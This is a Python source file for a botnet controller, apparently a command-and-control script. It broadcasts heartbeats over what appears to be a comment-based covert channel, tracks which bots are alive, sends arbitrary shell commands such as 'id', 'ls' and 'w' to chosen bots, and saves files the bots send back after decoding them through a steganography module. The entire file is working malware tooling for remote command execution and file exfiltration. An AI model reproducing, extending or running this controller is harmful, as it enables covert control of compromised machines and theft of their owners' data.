import argparse
import time
import datetime
import utils
from utils import Command
import log
import stegano

SHOW_INFO = True
LOGFILE = '.controllog'
BOT_TTL = 6  # After how many skipped heartbeats is bot considered dead.

LAST_COMMENT = 0
ALIVE_BOTS = {}


# TODO: more helpful message
def error(args):
    print("Bad input")
    print(args)


def heartbeat():
    global LAST_COMMENT
    LAST_COMMENT = utils.get_last_comment_id()
    log.add_log_entry(SHOW_INFO, LOGFILE, log.InitEntry(LAST_COMMENT))

    while True:
        send_heartbeat()
        if SHOW_INFO: print("SLEEP\n")
        time.sleep(utils.REFRESH_DELAY)
        check_bots()


def send_heartbeat():
    return send_command(utils.BROADCAST, Command.HEARTBEAT, "", True)


def check_bots():
    global LAST_COMMENT, ALIVE_BOTS, BOT_TTL
    messages, LAST_COMMENT = utils.get_fresh_messages(LAST_COMMENT)

    tick_bots()

    for msg in messages:
        ok, isctrl, bot, cmd, d, r = utils.parse_message(msg)
        if not ok: continue
        if isctrl: continue
        
        ALIVE_BOTS[bot] = BOT_TTL
        handle_response(bot, cmd, d)
    
    log.add_log_entry(SHOW_INFO, LOGFILE, log.AliveBots(ALIVE_BOTS))
    return len(ALIVE_BOTS)


def tick_bots():
    for bot in ALIVE_BOTS.keys():
        ttl = ALIVE_BOTS[bot] - 1
        if ttl <= 0:
            ALIVE_BOTS.pop(bot)
        else:
            ALIVE_BOTS[bot] = ttl


def handle_response(bot, cmd, data):
    if cmd != Command.HEARTBEAT:
        log.add_log_entry(SHOW_INFO, LOGFILE, log.Response(bot, cmd, data))

    if cmd == Command.SEND_FILE:
        s = data.find('\n')
        filepath, filedata = data[:s], data[s+1:]
        save_file(bot, filepath, filedata)


def send_command(bot, cmd, data, respond):
    msg = utils.construct_message(True, bot, cmd, data, respond)
    response = utils.send_message(msg)
    log.add_log_entry(SHOW_INFO, LOGFILE, log.Command(bot, cmd, data, respond))
    return response


def save_file(bot, filepath, data):
    filename = filepath + '.' + str(bot) + '.' + str(datetime.datetime.now())
    filedata = stegano.base64_to_text(data)

    file = open(filename, 'w+')
    file.write(filedata)
    file.close()


def main(args):
    if args.command == 'heartbeat' or args.command == 'hb':
        return heartbeat()

    respond = not args.noresponse

    if args.command == 'cmd' or args.command == 'exec':
        if (args.data == ''): return error(args)
        return send_command(args.bot, Command.CMD, args.data, respond)

    elif args.command == 'w':
        return send_command(args.bot, Command.CMD, 'w', respond)

    elif args.command == 'ls':
        return send_command(args.bot, Command.CMD, 'ls ' + args.data, respond)

    elif args.command == 'id':
        return send_command(args.bot, Command.CMD, 'id', respond)

    elif args.command == 'sendfile' or args.command == 'sf':
        if (args.data == ''): return error(args)
        return send_command(args.bot, Command.SEND_FILE, args.data, respond)


if __name__ == "__main__":
    utils.init_config()

    parser = argparse.ArgumentParser()
    parser.add_argument('command', choices=[
            'heartbeat', 'hb',
            'cmd', 'exec',
            'w', 'ls', 'id',
            'sendfile', 'sf',
        ])
    parser.add_argument('-d', '--data', default='')
    parser.add_argument('-b', '--bot', default=0, type=int)
    parser.add_argument('-s', '--silent', action='store_true')
    parser.add_argument('-n', '--noresponse', action='store_true')

    args = parser.parse_args()
    if args.silent: SHOW_INFO = False

    main(args)
